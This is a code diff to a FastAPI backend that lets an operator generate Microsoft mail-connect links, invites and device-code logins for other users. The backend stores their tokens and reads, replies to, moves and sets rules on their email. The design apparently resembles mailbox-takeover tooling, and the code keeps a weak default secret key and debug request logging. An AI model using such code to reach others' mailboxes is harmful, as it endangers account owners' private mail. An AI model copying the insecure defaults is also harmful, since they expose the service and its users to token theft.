@@ -4,13 +4,16 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import logging
 import os
+import requests
 from datetime import datetime, timedelta
 
 from jose import jwt, JWTError
 
 from auth import (
     generate_login_link,
+    generate_mail_connect_link,
     generate_org_connect_link,
+    generate_org_mail_connect_link,
     generate_admin_consent_url,
     exchange_code_for_token,
     get_token,
@@ -43,12 +46,9 @@ from models import (
 
 app = FastAPI()
 
-# =========================
-# JWT CONFIG
-# =========================
 SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
 ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days
+ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 
 CLIENT_ID = os.environ.get("CLIENT_ID", "3d3d5a12-09a4-4163-bab2-0188bf65ddd1")
 ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
@@ -119,14 +119,8 @@ def build_enterprise_notes(mode: str, organization_name: str | None, notes: str 
     return f"mode={safe_mode};org={safe_org};notes={safe_notes}"
 
 
-# =========================
-# LOGGING
-# =========================
 logging.basicConfig(level=logging.DEBUG)
 
-# =========================
-# CORS
-# =========================
 origins = [
     "http://localhost:3000",
     "https://frontend-xg84.onrender.com",
@@ -141,9 +135,6 @@ app.add_middleware(
 )
 
 
-# =========================
-# DEBUG MIDDLEWARE
-# =========================
 @app.middleware("http")
 async def log_requests(request: Request, call_next):
     logging.debug("\n--- REQUEST START ---")
@@ -158,17 +149,11 @@ async def log_requests(request: Request, call_next):
     return response
 
 
-# =========================
-# STARTUP
-# =========================
 @app.on_event("startup")
 def startup():
     init_db()
 
 
-# =========================
-# APP CONFIG / DASHBOARD
-# =========================
 @app.get("/app-config")
 def get_app_config():
     return {
@@ -239,9 +224,6 @@ def dashboard_summary(user=Depends(verify_token)):
         db.close()
 
 
-# =========================
-# ADMIN LOGIN
-# =========================
 @app.post("/admin/login")
 async def admin_login_route(request: Request):
     try:
@@ -265,9 +247,6 @@ async def admin_login_route(request: Request):
     }
 
 
-# =========================
-# TENANT CONSENT FLOW
-# =========================
 @app.post("/tenant-consent/generate")
 async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
     body = await request.json()
@@ -341,9 +320,6 @@ async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
     return {"status": "approved", "tenant_hint": tenant_hint}
 
 
-# =========================
-# ENTERPRISE MODE (backed by TenantConsent)
-# =========================
 @app.get("/enterprise/status")
 def enterprise_status(user_id: str, user=Depends(verify_token)):
     db = SessionLocal()
@@ -482,9 +458,6 @@ async def enterprise_approve(request: Request, user=Depends(verify_token)):
     }
 
 
-# =========================
-# MICROSOFT LOGIN
-# =========================
 @app.get("/login")
 def login(user_id: str, user=Depends(verify_token)):
     return RedirectResponse(generate_login_link(user_id))
@@ -502,7 +475,6 @@ def generate_login_url(user_id: str, user=Depends(verify_token)):
 
 @app.get("/generate-mail-connect-url")
 def generate_mail_connect_url(user_id: str, user=Depends(verify_token)):
-    login_url = generate_login_link(user_id)
     db = SessionLocal()
     try:
         tenant_hint = extract_tenant_hint(user_id)
@@ -519,6 +491,9 @@ def generate_mail_connect_url(user_id: str, user=Depends(verify_token)):
             )
             if row:
                 mode = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
+
+        login_url = generate_mail_connect_link(user_id, admin_user_id=user["sub"])
+
         return {
             "login_url": login_url,
             "user_id": user_id,
@@ -544,9 +519,9 @@ def generate_org_connect_url(tenant_hint: str | None = None, user=Depends(verify
 
 
 @app.get("/generate-org-mail-connect-url")
-def generate_org_mail_connect_url(tenant_hint: str | None = None, user=Depends(verify_token)):
+def generate_org_mail_connect_url_route(tenant_hint: str | None = None, user=Depends(verify_token)):
     admin_user_id = user["sub"]
-    login_url = generate_org_connect_link(admin_user_id, tenant_hint)
+    login_url = generate_org_mail_connect_link(admin_user_id, tenant_hint)
 
     return {
         "login_url": login_url,
@@ -566,9 +541,6 @@ def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(ver
     }
 
 
-# =========================
-# DEVICE CODE FLOW
-# =========================
 @app.post("/device-code/start")
 async def device_code_start(request: Request, user=Depends(verify_token)):
     admin_user_id = user["sub"]
@@ -579,7 +551,11 @@ async def device_code_start(request: Request, user=Depends(verify_token)):
         body = {}
 
     try:
-        result = start_device_code_flow()
+        result = start_device_code_flow(
+            mail_mode=bool(body.get("mail_mode")),
+            user_id=body.get("user_id"),
+            admin_user_id=admin_user_id,
+        )
         return {
             "admin_user_id": admin_user_id,
             "user_id": body.get("user_id"),
@@ -614,26 +590,33 @@ async def device_code_poll(request: Request, user=Depends(verify_token)):
         raise HTTPException(status_code=400, detail=str(e))
 
 
-# =========================
-# MICROSOFT STATUS
-# =========================
 @app.get("/microsoft/status")
 def microsoft_status(user_id: str, user=Depends(verify_token)):
     token_record = get_token(user_id)
     connected = token_record is not None and bool(getattr(token_record, "refresh_token", None))
 
+    inbox_connected = False
+
+    if token_record and getattr(token_record, "access_token", None):
+        try:
+            test_res = requests.get(
+                "https://graph.microsoft.com/v1.0/me/mailFolders?$top=1",
+                headers={"Authorization": f"Bearer {token_record.access_token}"},
+                timeout=15,
+            )
+            inbox_connected = test_res.status_code == 200
+        except Exception:
+            inbox_connected = False
+
     return {
         "user_id": user_id,
         "connected": connected,
-        "inbox_connected": connected,
+        "inbox_connected": inbox_connected,
         "has_refresh_token": bool(token_record.refresh_token) if token_record else False,
         "expires_at": token_record.expires_at if token_record else None
     }
 
 
-# =========================
-# SAVED USERS / CONNECTED USERS
-# =========================
 @app.get("/users")
 def list_users(user=Depends(verify_token)):
     db = SessionLocal()
@@ -746,9 +729,6 @@ def delete_saved_user(user_id: str, user=Depends(verify_token)):
         db.close()
 
 
-# =========================
-# CONNECT INVITES
-# =========================
 @app.get("/connect-invites")
 def list_connect_invites(user=Depends(verify_token)):
     db = SessionLocal()
@@ -772,7 +752,7 @@ def list_connect_invites(user=Depends(verify_token)):
                     "resolved_user_id": invite.resolved_user_id,
                     "job_title": getattr(invite, "job_title", None),
                     "is_used": invite.is_used,
-                    "created_at": invite.created_at,
+                    "created_at": getattr(invite, "created_at", None),
                     "used_at": invite.used_at
                 }
                 for invite in invites
@@ -782,9 +762,6 @@ def list_connect_invites(user=Depends(verify_token)):
         db.close()
 
 
-# =========================
-# OAUTH CALLBACK
-# =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
     init_db()
@@ -805,9 +782,6 @@ def auth_callback(request: Request):
         return JSONResponse({"error": str(e)}, status_code=400)
 
 
-# =========================
-# EMAILS
-# =========================
 @app.get("/emails")
 def get_emails(
     user_id: str | None = None,
@@ -846,9 +820,6 @@ def email_detail(message_id: str, user_id: str | None = None, user=Depends(verif
         raise HTTPException(status_code=400, detail=str(e))
 
 
-# =========================
-# EMAIL ACTIONS
-# =========================
 @app.post("/email/reply")
 async def reply_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
@@ -921,9 +892,6 @@ async def move_email_route(request: Request, user=Depends(verify_token)):
     )
 
 
-# =========================
-# RULES
-# =========================
 @app.post("/rules")
 async def add_rule(request: Request, user=Depends(verify_token)):
     body = await request.json()
